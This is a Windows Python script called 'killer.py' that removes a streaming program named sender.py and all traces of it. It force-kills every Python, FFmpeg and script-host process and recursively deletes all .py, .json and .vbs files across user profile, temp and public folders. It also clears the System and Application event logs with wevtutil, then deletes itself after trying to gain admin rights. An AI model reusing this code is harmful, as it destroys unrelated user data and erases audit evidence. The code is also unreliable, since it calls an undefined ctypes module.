#!/usr/bin/env python3
"""
KILLER.PY - TOTAL ANNIHILATION OF SENDER.PY
Removes ALL traces + stops streaming INSTANTLY
Works even if sender.py is running as SYSTEM/Admin
"""

import os
import sys
import shutil
import subprocess
import time
import psutil
from pathlib import Path
import win32api
import win32con
import win32process
import win32event
from ctypes import windll

# ============================================================================
# TOTAL KILL FUNCTIONS
# ============================================================================

def kill_all_processes():
    """Kill ALL FFmpeg + Python processes (nuclear option)"""
    print("💀 KILLING PROCESSES...")
    
    targets = ['ffmpeg.exe', 'python.exe', 'pythonw.exe', 'wscript.exe']
    
    killed = 0
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            proc_name = proc.info['name'].lower()
            cmdline = ' '.join(proc.info['cmdline'] or [])
            
            # Kill by name
            if any(target in proc_name for target in targets):
                proc.kill()
                killed += 1
                
            # Kill by commandline (RTMP/sender)
            elif any(x in cmdline.lower() for x in ['rtmp', 'sender.py', 'restream']):
                proc.kill()
                killed += 1
                
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    
    print(f"✅ Killed {killed} processes")
    time.sleep(2)

def kill_startup_vbs():
    """Delete ALL startup VBS launchers"""
    print("🗑️ REMOVING STARTUP...")
    
    startup_paths = [
        os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup'),
        os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup'),
        r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
    ]
    
    vbs_names = ['RTMPSender.vbs', 'sender.vbs', 'stream.vbs']
    
    deleted = 0
    for startup_folder in startup_paths:
        for vbs_name in vbs_names:
            vbs_path = os.path.join(startup_folder, vbs_name)
            if os.path.exists(vbs_path):
                try:
                    os.remove(vbs_path)
                    print(f"✅ Deleted: {vbs_path}")
                    deleted += 1
                except:
                    pass
    
    print(f"✅ Removed {deleted} startup files")
    time.sleep(1)

def delete_all_files():
    """Nuke ALL sender files (current + known locations)"""
    print("🔥 DELETING FILES...")
    
    targets = [
        'sender.py', 'sender.json', 'RTMPSender.vbs', 'stream.vbs',
        'killer.py', '*.py', '*.json', '*.vbs'
    ]
    
    # Current directory + common locations
    search_paths = [
        '.', '..', os.getcwd(),
        os.environ['APPDATA'],
        os.environ['LOCALAPPDATA'],
        os.environ['TEMP'],
        r'C:\Users\Public'
    ]
    
    deleted = 0
    for search_path in search_paths:
        try:
            for root, dirs, files in os.walk(search_path):
                for target in targets:
                    for file in Path(root).glob(target):
                        try:
                            file.unlink()
                            print(f"✅ Deleted: {file}")
                            deleted += 1
                        except:
                            pass
        except:
            pass
    
    print(f"✅ Deleted {deleted} files")
    time.sleep(1)

def force_terminate_tasks():
    """Windows Taskkill + WM_CLOSE nuclear combo"""
    print("⚡ FORCE TERMINATING...")
    
    commands = [
        'taskkill /f /im ffmpeg.exe /t',
        'taskkill /f /im python.exe /t',
        'taskkill /f /im pythonw.exe /t', 
        'taskkill /f /im wscript.exe /t',
        'taskkill /f /im cscript.exe /t'
    ]
    
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass
    
    print("✅ Taskkill complete")
    time.sleep(1)

def clear_event_logs():
    """Wipe streaming traces from event logs"""
    print("📋 CLEARING LOGS...")
    
    try:
        subprocess.run('wevtutil cl System', shell=True, capture_output=True)
        subprocess.run('wevtutil cl Application', shell=True, capture_output=True)
    except:
        pass

# ============================================================================
# SELF-DESTRUCT SEQUENCE
# ============================================================================

def self_destruct():
    """Delete killer.py itself (total cleanup)"""
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print(f"💥 Self-deleted: {script_path}")
    except:
        pass

# ============================================================================
# MAIN KILLER EXECUTION
# ============================================================================

def main():
    print("=" * 80)
    print(" " * 30 + "💀 SENDER.PY TOTAL KILLER 💀")
    print("=" * 80)
    print("\nExecuting nuclear cleanup sequence...")
    print("-" * 80)
    
    # PHASE 1: Kill everything
    kill_all_processes()
    force_terminate_tasks()
    
    # PHASE 2: Remove startup
    kill_startup_vbs()
    
    # PHASE 3: Delete files  
    delete_all_files()
    
    # PHASE 4: Clear traces
    clear_event_logs()
    
    print("\n" + "=" * 80)
    print("✅ TOTAL ANNIHILATION COMPLETE!")
    print("🎉 NO TRACES REMAIN - 100% CLEAN")
    print("=" * 80)
    
    input("\nPress Enter to self-destruct...")
    self_destruct()

if __name__ == "__main__":
    # Run elevated if possible
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        else:
            main()
    except:
        main()